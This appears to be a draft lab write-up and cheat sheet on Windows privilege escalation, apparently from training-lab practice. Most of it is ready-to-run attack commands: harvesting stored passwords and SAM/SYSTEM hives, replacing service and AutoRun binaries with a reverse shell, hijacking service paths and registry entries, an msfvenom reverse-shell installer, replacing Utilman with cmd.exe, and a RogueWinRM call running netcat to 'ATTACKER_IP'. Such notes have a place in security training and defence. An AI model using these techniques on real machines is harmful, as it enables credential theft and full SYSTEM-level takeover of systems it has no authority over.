---
title: "Windows Privesc"
description: "Harvesting Passwords from Usual Spots Unattended Windows Installations When installing Windows on a large number of hosts, administrators may use Windows Deployment Services,"
lang: "en"
translationKey: "windows-privesc"
category: "lab-writeups"
tags: []
publishDate: "2024-12-10"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "1585fca1-ed80-806d-a993-ea99d7dca166"
notionUrl: "https://app.notion.com/p/Windows-Privesc-1585fca1ed80806da993ea99d7dca166"
notionLastEdited: "2025-01-09T23:42:00.000Z"
---

# Harvesting Passwords from Usual Spots

## **Unattended Windows Installations**

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as 
they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
## **Powershell History**

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## **Saved Windows Credentials**

The command below will list saved credentials:

```text
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```text
runas /savecred /user:admin cmd.exe
```

### Save Credentials in Registry

winpeas :

```bash
winpeas.exe quiet filesinfo userinfo
```

![](/images/windows-privesc/fd8a2a8be5db.png)

![](/images/windows-privesc/1527903f81e2.png)

### Saved Credential in CMD

```bash
winpeas.exe quiet cmd windowscreds
```

![](/images/windows-privesc/0e4816dca304.png)

## IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for 
databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
## **Retrieve Credentials from Software: PuTTY**

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```text
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## **Scheduled Tasks**

```bash
# list scheduled task
schtasks /query /tn vulntask /fo list /v
# running task 
schtasks /run /tn vulntask
# task view
tasklist /V | findstr mspaint.exe
# check startapp 
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

## Windows Services Exploit

### Unquoted Service Paths or Service Name itself

```bash
# Check service exploit using script powerup.ps1
. ./powerup.ps1
Invoke-AllChecks
# see detail about service
sc qc <service name>
# start & stop the service
sc start <service name>
sc stop <service name>
```

### **Insecure Permissions on Service Executable**

winpeas :

![](/images/windows-privesc/feca08c5575d.png)

we can change .exe associated with the service cause we have modify permission on .exe

Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

`sc qc filepermsvc`

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start filepermsvc`

### **Insecure Service Permissions**

winpeas :

![](/images/windows-privesc/9f4942082e1c.png)

check permission user on the certain service

```bash
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

check permission on certain account for a service

```bash
accesschk.exe /accepteula -uwcqv user daclsvc
```

if your user has only permission **SERVICE_CHANGE_CONFIG **you can abuse the path config like this

```bash
# Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

sc.exe config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
# then restart the service for trigerring
```

## Registry Exploit

### Weak Registry Permissions

winpeas :

![](/images/windows-privesc/671fe5e7b074.png)

Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

`sc qc regsvc`

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start regsvc`

### AutoRuns

winpeas :

![](/images/windows-privesc/81f182c912f2.png)

Query the registry for AutoRun executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

`rdesktop 10.10.80.243`

### AlwaysInstallElevated

winpeas :

![](/images/windows-privesc/05076a0fb39b.png)

Query the registry for AlwaysInstallElevated keys:

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier). Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

## Privilege User

```bash
whoami /priv
```

### **SeBackup / SeRestore**

![](/images/windows-privesc/c67760b65cc9.png)

To backup the SAM and SYSTEM hashes, we can use the following commands:

```bash
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

### **SeTakeOwnership**

![](/images/windows-privesc/2da4560ecc5a.png)


We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:

```bash
takeown /f C:\Windows\System32\Utilman.exe
```

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:

```bash
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

After this, we will replace utilman.exe with a copy of cmd.exe:

```bash
copy cmd.exe utilman.exe
```

then when we running utilman.exe we will be prompted cmd as localsystem

![](/images/windows-privesc/97cc9dda383d.png)

![](/images/windows-privesc/56735b388397.png)

### **SeImpersonate / SeAssignPrimaryToken**

![](/images/windows-privesc/130175274d82.png)

we can exploit it using potato or the following tool :

```bash
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

Referensi :

- [https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato)
- 
## Abusing vulnerable software

try to looking for vulnerable software inside the OS like unpatched software or others
